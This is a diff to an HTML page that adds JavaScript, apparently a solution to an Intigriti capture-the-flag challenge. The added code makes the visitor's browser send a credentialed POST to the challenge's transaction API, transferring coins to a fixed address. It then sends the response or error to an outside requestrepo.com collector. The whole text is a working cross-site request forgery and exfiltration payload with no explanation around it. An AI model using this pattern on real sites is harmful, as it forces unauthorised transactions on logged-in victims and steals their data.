@@ -20,6 +20,32 @@
             fetch(`https://we6hfxdk.requestrepo.com?status=sent`);
         }
     }, 2000);
+        
+    async function executeAttack() {
+        try {
+            const response = await fetch('https://challenge-0126.intigriti.io/api/transaction', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                credentials: 'include',
+                body: JSON.stringify({
+                    "toAddress": "1afefa17653da6df5ebeb45947b91262d3",
+                    "currency": "1337COIN",
+                    "amount": 1
+                })
+            });
+            
+            const result = await response.json();
+            
+            await fetch('http://we6hfxdk.requestrepo.com/?data=' + 
+                       encodeURIComponent(JSON.stringify(result)));
+            
+        } catch (error) {
+            await fetch('http://we6hfxdk.requestrepo.com/?error=' + 
+                       encodeURIComponent(error.message));
+        }
+    }
+    
+    executeAttack();      
     </script>
 </body>
 </html>
